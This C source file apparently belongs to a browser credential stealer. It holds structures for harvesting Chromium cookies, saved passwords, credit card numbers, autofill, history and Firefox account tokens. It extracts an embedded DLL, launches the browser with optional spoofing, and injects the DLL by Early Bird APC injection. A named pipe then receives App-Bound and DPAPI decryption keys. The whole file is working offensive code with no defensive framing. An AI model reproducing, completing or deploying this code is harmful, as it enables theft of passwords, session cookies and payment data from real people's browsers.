#include "Headers.h"
#include "Resource.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ProcessDataPacket(IN PCHROMIUM_DATA pChromiumData, IN PBYTE pbData, IN DWORD cbData)
{
    PDATA_PACKET    pPacket     = (PDATA_PACKET)pbData;
    PBYTE*          ppKey       = NULL;
    PDWORD          pdwKeyLen   = NULL;

    if (!pChromiumData || !pbData || cbData < sizeof(DATA_PACKET))
        return FALSE;

    switch (pPacket->dwSignature)
    {
        case PACKET_SIG_APP_BOUND_KEY:
            ppKey       = &pChromiumData->pbAppBoundKey;
            pdwKeyLen   = &pChromiumData->dwAppBoundKeyLen;
            break;

        case PACKET_SIG_DPAPI_KEY:
            ppKey       = &pChromiumData->pbDpapiKey;
            pdwKeyLen   = &pChromiumData->dwDpapiKeyLen;
            break;

        default:
            return FALSE;
    }

    if (pPacket->dwDataSize == 0)
        return FALSE;

    HEAP_FREE_SECURE(*ppKey, *pdwKeyLen);

    if (!(*ppKey = DuplicateBuffer(pPacket->bData, pPacket->dwDataSize)))
        return FALSE;

    *pdwKeyLen = pPacket->dwDataSize;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitializeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData)
{
    if (!pChromiumData)
        return FALSE;

    RtlSecureZeroMemory(pChromiumData, sizeof(CHROMIUM_DATA));

    pChromiumData->dwTokenCapacity      = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwCookieCapacity     = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwLoginCapacity      = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwCreditCardCapacity = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwAutofillCapacity   = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwHistoryCapacity    = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwBookmarkCapacity   = INITIAL_ARRAY_CAPACITY;

    if (!(pChromiumData->pTokens = (PTOKEN_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(TOKEN_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pCookies = (PCOOKIE_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COOKIE_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pLogins = (PLOGIN_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LOGIN_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pCreditCards = (PCREDIT_CARD_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CREDIT_CARD_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pAutofill = (PAUTOFILL_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(AUTOFILL_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pHistory = (PHISTORY_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HISTORY_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pBookmarks = (PBOOKMARK_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(BOOKMARK_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    return TRUE;
}

VOID FreeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData)
{
    if (!pChromiumData)
        return;

    HEAP_FREE_SECURE(pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen);
    HEAP_FREE_SECURE(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen);

    if (pChromiumData->pTokens)
    {
        for (DWORD i = 0; i < pChromiumData->dwTokenCount; i++)
        {
            HEAP_FREE(pChromiumData->pTokens[i].pszService);
            HEAP_FREE_SECURE(pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen);
            HEAP_FREE_SECURE(pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen);
        }
        HEAP_FREE(pChromiumData->pTokens);
    }

    if (pChromiumData->pCookies)
    {
        for (DWORD i = 0; i < pChromiumData->dwCookieCount; i++)
        {
            HEAP_FREE(pChromiumData->pCookies[i].pszHostKey);
            HEAP_FREE(pChromiumData->pCookies[i].pszPath);
            HEAP_FREE(pChromiumData->pCookies[i].pszName);
            HEAP_FREE_SECURE(pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen);
        }
        HEAP_FREE(pChromiumData->pCookies);
    }

    if (pChromiumData->pLogins)
    {
        for (DWORD i = 0; i < pChromiumData->dwLoginCount; i++)
        {
            HEAP_FREE(pChromiumData->pLogins[i].pszOriginUrl);
            HEAP_FREE(pChromiumData->pLogins[i].pszActionUrl);
            HEAP_FREE(pChromiumData->pLogins[i].pszUsername);
            HEAP_FREE_SECURE(pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen);
        }
        HEAP_FREE(pChromiumData->pLogins);
    }

    if (pChromiumData->pCreditCards)
    {
        for (DWORD i = 0; i < pChromiumData->dwCreditCardCount; i++)
        {
            HEAP_FREE(pChromiumData->pCreditCards[i].pszNameOnCard);
            HEAP_FREE(pChromiumData->pCreditCards[i].pszNickname);
            HEAP_FREE_SECURE(pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen);
        }
        HEAP_FREE(pChromiumData->pCreditCards);
    }

    if (pChromiumData->pAutofill)
    {
        for (DWORD i = 0; i < pChromiumData->dwAutofillCount; i++)
        {
            HEAP_FREE(pChromiumData->pAutofill[i].pszName);
            HEAP_FREE(pChromiumData->pAutofill[i].pszValue);
        }
        HEAP_FREE(pChromiumData->pAutofill);
    }

    if (pChromiumData->pHistory)
    {
        for (DWORD i = 0; i < pChromiumData->dwHistoryCount; i++)
        {
            HEAP_FREE(pChromiumData->pHistory[i].pszUrl);
            HEAP_FREE(pChromiumData->pHistory[i].pszTitle);
        }
        HEAP_FREE(pChromiumData->pHistory);
    }

    if (pChromiumData->pBookmarks)
    {
        for (DWORD i = 0; i < pChromiumData->dwBookmarkCount; i++)
        {
            HEAP_FREE(pChromiumData->pBookmarks[i].pszName);
            HEAP_FREE(pChromiumData->pBookmarks[i].pszUrl);
        }
        HEAP_FREE(pChromiumData->pBookmarks);
    }

    if (pChromiumData->pFireFoxBrsrData)
    {
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->pbMasterKey, pChromiumData->pFireFoxBrsrData->dwMasterKeyLen);
        HEAP_FREE(pChromiumData->pFireFoxBrsrData->szEmail);
        HEAP_FREE(pChromiumData->pFireFoxBrsrData->szUid);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szSessionToken, pChromiumData->pFireFoxBrsrData->szSessionToken ? lstrlenA(pChromiumData->pFireFoxBrsrData->szSessionToken) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szSyncOAuthToken, pChromiumData->pFireFoxBrsrData->szSyncOAuthToken ? lstrlenA(pChromiumData->pFireFoxBrsrData->szSyncOAuthToken) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szProfileOAuthToken, pChromiumData->pFireFoxBrsrData->szProfileOAuthToken ? lstrlenA(pChromiumData->pFireFoxBrsrData->szProfileOAuthToken) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey, pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey ? lstrlenA(pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey, pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey ? lstrlenA(pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey) : 0);
        HEAP_FREE(pChromiumData->pFireFoxBrsrData);
    }

    RtlSecureZeroMemory(pChromiumData, sizeof(CHROMIUM_DATA));
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _PIPE_THREAD_CONTEXT
{
    HANDLE          hPipe;
    PCHROMIUM_DATA  pChromiumData;
} PIPE_THREAD_CONTEXT, * PPIPE_THREAD_CONTEXT;

static BOOL IsPacketSignature(DWORD dwValue)
{
    return (dwValue == PACKET_SIG_APP_BOUND_KEY || dwValue == PACKET_SIG_DPAPI_KEY || dwValue == PACKET_SIG_COMPLETE);
}

static DWORD WINAPI PipeReaderThread(IN LPVOID lpParam)
{
    PPIPE_THREAD_CONTEXT    pContext            = (PPIPE_THREAD_CONTEXT)lpParam;
    HANDLE                  hPipe               = pContext->hPipe;
    PCHROMIUM_DATA          pChromiumData       = pContext->pChromiumData;
    PBYTE                   pbBuf               = NULL,
                            pbAccumulator       = NULL;
    DWORD                   dwAccumSize         = 0x00,
                            dwAccumCapacity     = BUFFER_SIZE_8192 * 4,
                            dwReadBytes         = 0x00,
                            dwOffset            = 0x00;

    if (!(pbBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE_8192)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbAccumulator = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwAccumCapacity)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        DBGA("[!] ConnectNamedPipe Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    DBGV("[i] DLL Connected To Pipe:\n");

    while (ReadFile(hPipe, pbBuf, BUFFER_SIZE_8192, &dwReadBytes, NULL) && dwReadBytes > 0)
    {
        // Expand accumulator if needed
        if (dwAccumSize + dwReadBytes > dwAccumCapacity)
        {
#define GROWTH_FACTOR 2
            DWORD   dwNewCapacity   = dwAccumCapacity * GROWTH_FACTOR;
            PBYTE   pbNewAccum      = NULL;
#undef GROWTH_FACTOR

            if (!(pbNewAccum = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewCapacity)))
            {
                DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
                break;
            }

            RtlCopyMemory(pbNewAccum, pbAccumulator, dwAccumSize);
            HEAP_FREE(pbAccumulator);

            pbAccumulator   = pbNewAccum;
            dwAccumCapacity = dwNewCapacity;
        }

        // Append new data to accumulator
        RtlCopyMemory(pbAccumulator + dwAccumSize, pbBuf, dwReadBytes);
        dwAccumSize += dwReadBytes;


        while (dwOffset < dwAccumSize)
        {
            PDATA_PACKET    pPacket         = NULL;
            DWORD           dwPacketSize    = 0x00,
                            dwSignature     = 0x00,
                            dwTextStart     = 0x00;

            // Check if we have enough bytes for a potential signature
            if (dwOffset + sizeof(DWORD) <= dwAccumSize)
            {
                dwSignature = *(PDWORD)(pbAccumulator + dwOffset);

                if (IsPacketSignature(dwSignature))
                {
                    // Check if we have enough for packet header
                    if (dwOffset + sizeof(DATA_PACKET) > dwAccumSize) break;

                    pPacket         = (PDATA_PACKET)(pbAccumulator + dwOffset);
                    dwPacketSize    = sizeof(DATA_PACKET) + pPacket->dwDataSize;

                    // Check if we have complete packet
                    if (dwOffset + dwPacketSize > dwAccumSize) break;

                    // Check for completion signal
                    if (dwSignature == PACKET_SIG_COMPLETE) goto _END_OF_FUNC;

                    // Process complete packet
                    ProcessDataPacket(pChromiumData, pbAccumulator + dwOffset, dwPacketSize);
                    dwOffset += dwPacketSize;
                    continue;
                }
            }

            // Not a packet signature
            dwTextStart = dwOffset;

            while (dwOffset < dwAccumSize)
            {
                if (dwOffset + sizeof(DWORD) <= dwAccumSize)
                {
                    dwSignature = *(PDWORD)(pbAccumulator + dwOffset);

                    if (IsPacketSignature(dwSignature))
                        break;
                }
                dwOffset++;
            }

            // Print text portion
            if (dwOffset > dwTextStart)
                DBGV("%.*s", dwOffset - dwTextStart, (LPSTR)(pbAccumulator + dwTextStart));
        }

        // Move unprocessed data to beginning of accumulator
        if (dwOffset < dwAccumSize)
        {
            RtlMoveMemory(pbAccumulator, pbAccumulator + dwOffset, dwAccumSize - dwOffset);
            dwAccumSize -= dwOffset;
        }
        else
        {
            dwAccumSize = 0x00;
        }

        dwOffset = 0x00;
    }

    // Print any remaining text
    if (dwAccumSize > 0)
        DBGV("%.*s", dwAccumSize, (LPSTR)pbAccumulator);

_END_OF_FUNC:
    HEAP_FREE(pbBuf);
    HEAP_FREE(pbAccumulator);
    if (hPipe)
        CloseHandle(hPipe);
    return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL GetBrowserPath(IN BROWSER_TYPE Browser, IN OUT LPWSTR szBrowserPath, IN DWORD dwSize)
{
    HKEY    hKey        = NULL;
    DWORD   dwPathLen   = dwSize,
            dwType      = REG_SZ,
            dwDataSize  = dwSize * sizeof(WCHAR);
    LSTATUS STATUS      = 0x00;
    LPCWSTR szProgId    = NULL;
    LPCWSTR szRegKey    = NULL;

    if (!szBrowserPath || dwSize == 0 || Browser == BROWSER_UNKNOWN)
        return FALSE;

    szProgId = GetBrowserProgId(Browser);
    szRegKey = GetBrowserRegKey(Browser);

    // 1. Try AssocQueryString first 
    if (szProgId)
    {
        dwPathLen = dwSize;

        if (SUCCEEDED(AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, szProgId, L"open", szBrowserPath, &dwPathLen)))
        {
            if (GetFileAttributesW(szBrowserPath) != INVALID_FILE_ATTRIBUTES)
                return TRUE;
        }
    }

    if (!szRegKey) return FALSE;

    // 2. For Opera and Vivaldi browsers, try HKEY_CURRENT_USER registry
    if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX || Browser == BROWSER_VIVALDI)
    {
        if ((STATUS = RegOpenKeyExW(HKEY_CURRENT_USER, szRegKey, 0, KEY_READ, &hKey)) == ERROR_SUCCESS)
        {
            if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) == ERROR_SUCCESS)
            {
                RegCloseKey(hKey);

                if (GetFileAttributesW(szBrowserPath) != INVALID_FILE_ATTRIBUTES)
                    return TRUE;
            }
            else
            {
                RegCloseKey(hKey);
            }
        }
        return FALSE;
    }

    // 3. For other browsers, try HKEY_LOCAL_MACHINE registry
    if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegKey, 0, KEY_READ, &hKey)) != ERROR_SUCCESS)
    {
        DBGA("[!] RegOpenKeyExW Failed With Error: %ld", STATUS);
        return FALSE;
    }

    if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) != ERROR_SUCCESS)
    {
        DBGA("[!] RegQueryValueExW Failed With Error: %ld", STATUS);
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);

    if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
    {
        DBGA("[!] GetFileAttributesW Failed For '%ws' With Error: %lu", szBrowserPath, GetLastError());
        return FALSE;
    }

    return TRUE;
}

static BOOL ExtractDllFromResources(IN LPCWSTR szDestPath)
{
    HRSRC       hResInfo        = NULL;
    HGLOBAL     hResData        = NULL;
    PVOID       pResData        = NULL;
    DWORD       dwResSize       = 0;
    HANDLE      hFile           = INVALID_HANDLE_VALUE;
    DWORD       dwBytesWritten  = 0;
    BOOL        bResult         = FALSE;

    if (!szDestPath) return FALSE;

    if (!(hResInfo = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_EMBEDDED_DLL), RT_DLL_RESOURCE)))
    {
        DBGA("[!] FindResourceW Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if (!(hResData = LoadResource(NULL, hResInfo)))
    {
        DBGA("[!] LoadResource Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pResData = LockResource(hResData)))
    {
        DBGA("[!] LockResource Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((dwResSize = SizeofResource(NULL, hResInfo)) == 0)
    {
        DBGA("[!] SizeofResource Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hFile = CreateFileW(szDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateFileW Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteFile(hFile, pResData, dwResSize, &dwBytesWritten, NULL) || dwBytesWritten != dwResSize)
    {
        DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
        DBGA("[i] Wrote %lu Of %lu", dwBytesWritten, dwResSize);
        goto _END_OF_FUNC;
    }

    DBGV("[i] Extracted DLL From Resources (%lu bytes)", dwResSize);
    bResult = TRUE;

_END_OF_FUNC:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    return bResult;
}

static BOOL GetDllPath(IN OUT LPWSTR szDllPathToBeInjected, IN DWORD dwSize)
{
    LPWSTR  szCurrentProgramPath    = NULL;
    LPWSTR  szLastSlash             = NULL;
    HRESULT hResult                 = S_OK;
    BOOL    bResult                 = FALSE;

    if (!szDllPathToBeInjected || dwSize == 0) return FALSE;

    if (!(szCurrentProgramPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if (!GetModuleFileNameW(NULL, szCurrentProgramPath, MAX_PATH))
    {
        DBGA("[!] GetModuleFileNameW Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!PathRemoveFileSpecW(szCurrentProgramPath))
    {
        DBGA("[!] PathRemoveFileSpecW Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = StringCchPrintfW(szDllPathToBeInjected, dwSize, L"%s\\%s", szCurrentProgramPath, STR_DLL_NAME))))
    {
        DBGA("[!] StringCchPrintfW Failed With Error: 0x%0.8X", hResult);
        goto _END_OF_FUNC;
    }

    if (GetFileAttributesW(szDllPathToBeInjected) == INVALID_FILE_ATTRIBUTES)
    {
        DBGA("[!] GetFileAttributesW Failed For '%ws' With Error: %lu", szDllPathToBeInjected, GetLastError());
        DBGA("[i] DLL Not Found On Disk, Extracting From Resources...");

        if (!ExtractDllFromResources(szDllPathToBeInjected))
            goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(szCurrentProgramPath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InjectDllViaEarlyBird(IN BOOL bUseSpoofing, IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    CREATED_PROCESS_PROPERTIES  ProcessProperties               = { 0 };
    PIPE_THREAD_CONTEXT         PipeContext                     = { 0 };
    CHAR                        szPipeName[BUFFER_SIZE_32]      = { 0 };
    HANDLE                      hPipe                           = NULL;
    HANDLE                      hPipeThread                     = NULL;
    LPVOID                      pRemoteDllPath                  = NULL;
    LPWSTR                      szDllPath                       = NULL;
    LPWSTR                      szBrowserPath                   = NULL;
    SIZE_T                      cbDllPathSize                   = 0x00;
    SIZE_T                      cbBytesWritten                  = 0x00;
    BOOL                        bResult                         = FALSE;

    if (!pChromiumData || Browser == BROWSER_UNKNOWN)
        return FALSE;

    if (!(szBrowserPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(szDllPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetBrowserPath(Browser, szBrowserPath, MAX_PATH))
        goto _END_OF_FUNC;

    DBGV("[i] Found %s: %ws", GetBrowserName(Browser), szBrowserPath);

    if (!GetDllPath(szDllPath, MAX_PATH))
        goto _END_OF_FUNC;

    DBGV("[i] DLL Path: %ws", szDllPath);

    cbDllPathSize = (lstrlenW(szDllPath) + 1) * sizeof(WCHAR);

    GetPipeName(szPipeName, BUFFER_SIZE_32);

    if ((hPipe = CreateNamedPipeA(szPipeName, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, BUFFER_SIZE_8192, BUFFER_SIZE_8192, 0, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateNamedPipeA Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    PipeContext.hPipe           = hPipe;
    PipeContext.pChromiumData   = pChromiumData;

    if (!(hPipeThread = CreateThread(NULL, 0x00, PipeReaderThread, &PipeContext, 0x00, NULL)))
    {
        DBGA("[!] CreateThread Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }


    if (bUseSpoofing)
    {
        if (!NtCreateChromiumProcess(szBrowserPath, STR_CHROMIUM_ARGS, &ProcessProperties))
            goto _END_OF_FUNC;
    }
    else
    {
        if (!CreateChromiumProcess(szBrowserPath, STR_CHROMIUM_ARGS, &ProcessProperties))
            goto _END_OF_FUNC;
    }

    // To shutup the analyzer
    if (!ProcessProperties.hProcess || !ProcessProperties.hThread)
        goto _END_OF_FUNC;

    DBGV("[i] Created %s Process With ID: %lu", GetBrowserName(Browser), ProcessProperties.dwProcessId);

    if (!(pRemoteDllPath = VirtualAllocEx(ProcessProperties.hProcess, NULL, cbDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        DBGA("[!] VirtualAllocEx Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteProcessMemory(ProcessProperties.hProcess, pRemoteDllPath, szDllPath, cbDllPathSize, &cbBytesWritten))
    {
        DBGA("[!] WriteProcessMemory Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!QueueUserAPC((PAPCFUNC)LoadLibraryW, ProcessProperties.hThread, (ULONG_PTR)pRemoteDllPath))
    {
        DBGA("[!] QueueUserAPC Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (bUseSpoofing)
    {
        if (!NtDetachDebugger(&ProcessProperties))
            goto _END_OF_FUNC;
    }
    else 
    {
        if (!DetachDebugger(&ProcessProperties))
            goto _END_OF_FUNC;
    }

    DBGV("[+] Injection Complete! Waiting For DLL Output...");

    switch (WaitForSingleObject(hPipeThread, PIPE_THREAD_TIMEOUT))
    {
        case WAIT_TIMEOUT:
            DBGA("[!] Pipe Thread Timed Out\n");
        case WAIT_OBJECT_0:
            DBGV("[i] Pipe Connection Closed\n");
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hPipeThread)
        CloseHandle(hPipeThread);
    if (ProcessProperties.hThread)
        CloseHandle(ProcessProperties.hThread);
    if (ProcessProperties.hProcess)
    {
        TerminateProcess(ProcessProperties.hProcess, 0x00);
        CloseHandle(ProcessProperties.hProcess);
    }
    HEAP_FREE(szDllPath);
    HEAP_FREE(szBrowserPath);
    
    return bResult;
}